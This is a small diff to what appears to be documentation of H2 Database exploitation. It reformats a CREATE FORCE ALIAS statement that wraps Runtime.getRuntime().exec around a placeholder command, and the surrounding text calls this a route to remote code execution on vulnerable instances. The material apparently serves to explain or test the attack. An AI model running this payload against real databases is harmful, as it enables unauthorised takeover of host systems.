@@ -42,8 +42,7 @@ The exploitation strategy varies based on the version of the H2 Database:
 CREATE FORCE ALIAS CMD_INJECT AS $$
   void pwshInject() throws Exception {
       Runtime.getRuntime().exec("%s");
-  }
-$$;
+  }$$;
 ```
 
 By leveraging these methods, an attacker can perform remote code execution on vulnerable H2 Database instances, potentially gaining control over the host system.
